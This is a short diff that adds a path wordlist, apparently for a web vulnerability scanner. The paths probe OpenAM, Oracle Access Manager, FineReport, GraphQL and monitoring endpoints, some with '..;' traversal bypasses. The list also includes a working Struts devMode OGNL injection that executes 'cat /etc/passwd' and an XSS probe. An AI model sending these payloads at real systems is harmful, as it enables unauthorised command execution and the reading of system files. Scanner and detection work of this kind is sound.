@@ -1,0 +1,14 @@
+/openam/oauth2/..;/ccversion/Version
+/oam/server/opensso/sessionservice
+/scheduler/ui/js/ffffffffbca41eb4/UIUtilJavaScriptJS?/..
+/ReportServer?op=fr_server&cmd=sc_getconnectioninfo
+/WebReport/ReportServer?op=fr_server&cmd=sc_getconnectioninfo
+/graphql
+/api/graphql
+/query
+/
+/error
+/devmode.action?debug=command&expression=(%23_memberAccess[%22allowStaticMethodAccess%22]%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context[%22xwork.MethodAccessor.denyMethodExecution%22]%3D%23foo%2C@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%27cat%20/etc/passwd%27).getInputStream()))
+/te%3Cimg%20src=x%20onerror=alert(42)%3Est
+/monitoring
+/..%3B/monitoring
